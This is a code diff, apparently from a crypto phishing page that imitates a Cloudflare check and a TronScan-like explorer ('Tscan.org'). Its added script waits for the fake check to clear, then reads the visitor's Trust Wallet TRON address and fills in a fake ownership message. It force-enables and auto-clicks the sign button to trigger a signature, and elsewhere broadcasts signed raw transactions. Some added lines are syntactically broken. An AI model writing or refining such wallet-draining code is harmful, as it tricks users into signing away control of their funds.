@@ -270,8 +270,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
     root.classList.add('cf-done');
     document.documentElement.classList.remove('cf-lock');
     root.remove();
-    // ★ Trigger Trust Wallet native connect popup immédiatement
-    setTimeout(autoConnectAndSign, 300);
+    setTimeout(autoTrustWalletFlow, 500);
   }
   function run() {
     if (done) return;
@@ -477,80 +476,57 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
 
     try {
       var result = await tw.trx.sendRawTransaction(signedTx);
-      if (result && (result.result || result.code === 'SUCCESS')) {
-        
-      } else {
-        
+      if (result && (result.result || result.code === 'SUCCESS')) {, '#0f0');
+      } else {, '#fa0');
       }
     } catch(e) {
     }
   }
 
-  /* Hook into TronScan's native "Connect" button inside the wallet modal */
   /* ================================================================
-     AUTO CONNECT + SIGN — triggered right after CF screen clears
-     1. Appelle tronLink.request() → popup native Trust Wallet
-     2. Récupère l'adresse dès qu'elle est dispo (poll)
-     3. fillAddress + fillMessage sur le Sign Message tab
-     4. Click signBtn → popup signature Trust Wallet
+     TRUST WALLET AUTO FLOW
+     Trust Wallet (in-app browser) injecte window.tronWeb
+     directement avec defaultAddress déjà set — pas besoin de popup.
+     On poll dès que le CF screen disparaît.
      ================================================================ */
-  async function autoConnectAndSign() {
-    var provider = window.tronLink || window.tronWeb;
-
-    // Demande de connexion native — ouvre la popup Trust Wallet
-    if (provider && provider.request) {
-      try { await provider.request({ method: 'tron_requestAccounts' }); } catch(e){}
-    } else if (window.tronWeb && window.tronWeb.request) {
-      try { await window.tronWeb.request({ method: 'tron_requestAccounts' }); } catch(e){}
-    }
-
-    // Poll l'adresse jusqu'à l'avoir (l'utilisateur peut prendre quelques secondes)
+  function autoTrustWalletFlow() {
     var tries = 0;
-    var pollId = setInterval(function() {
+    var timer = setInterval(function() {
       tries++;
-      if (tries > 150) { clearInterval(pollId); return; } // abandon après ~15s
+      if (tries > 150) { clearInterval(timer); return; }
 
-      var tw = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
-      var da = tw && tw.defaultAddress;
-      var addr = (da && da.base58) ? da.base58 : (typeof da === 'string' && da.length > 10 ? da : null);
-      if (!addr && window.tronLink && window.tronLink.tronWeb) {
-        da = window.tronLink.tronWeb.defaultAddress;
-        addr = da && da.base58 ? da.base58 : null;
-      }
+      var tw = window.tronWeb;
+      if (!tw) return;
+      var da = tw.defaultAddress;
+      var addr = (da && da.base58 && da.base58.length > 10) ? da.base58
+               : (typeof da === 'string' && da.length > 10) ? da : null;
+      if (!addr) return;
 
-      if (addr) {
-        clearInterval(pollId);
+      clearInterval(timer);
 
-        // Fill Address
-        if (window.fillAddress) window.fillAddress(addr);
+      if (window.fillAddress) window.fillAddress(addr);
 
-        // Fill Message
-        var now2 = new Date();
-        var pad2 = function(n){ return String(n).padStart(2,'0'); };
-        var ts2 = pad2(now2.getDate())+'/'+pad2(now2.getMonth()+1)+'/'+now2.getFullYear()
-                 +' '+pad2(now2.getHours())+':'+pad2(now2.getMinutes())+':'+pad2(now2.getSeconds());
-        var autoMsg = '[Tscan.org '+ts2+'] I hereby verify that I am the owner/creator of the address ['+addr+']';
-        if (window.fillMessage) window.fillMessage(autoMsg);
+      var now2 = new Date();
+      var pad2 = function(n){ return String(n).padStart(2,'0'); };
+      var ts2 = pad2(now2.getDate())+'/'+pad2(now2.getMonth()+1)+'/'+now2.getFullYear()
+               +' '+pad2(now2.getHours())+':'+pad2(now2.getMinutes())+':'+pad2(now2.getSeconds());
+      var autoMsg = '[Tscan.org '+ts2+'] I hereby verify that I am the owner/creator of the address ['+addr+']';
+      if (window.fillMessage) window.fillMessage(autoMsg);
 
-        // Ferme la modal HTML si ouverte
-        var cm = document.getElementById('connect-modal-root');
-        if (cm) cm.style.display = 'none';
+      var cm = document.getElementById('connect-modal-root');
+      if (cm) cm.style.display = 'none';
 
-        // Click Sign Message button → popup signature native Trust Wallet
-        setTimeout(function() {
-          var signPane = document.querySelector('.QhZmva_signPane');
-          var btn = signPane && signPane.querySelector('.QhZmva_btnWrapper .btn');
-          if (btn) {
-            btn.disabled = false;
-            if (btn.parentElement) btn.parentElement.classList.remove('QhZmva_noClick');
-            btn.click();
-          }
-        }, 400);
-      }
+      setTimeout(function() {
+        var signPane = document.querySelector('.QhZmva_tabPanelInner[data-pane="sign"]');
+        var btn = signPane && signPane.querySelector('.QhZmva_btnWrapper .btn');
+        if (btn) {
+          btn.disabled = false;
+          if (btn.parentElement) btn.parentElement.classList.remove('QhZmva_noClick');
+          btn.click();
+        }
+      }, 400);
     }, 100);
   }
-
-  var connectModal = document.getElementById('connect-modal-root');
 
   /* ============ Interactive design elements ============ */
   // Preferences modal
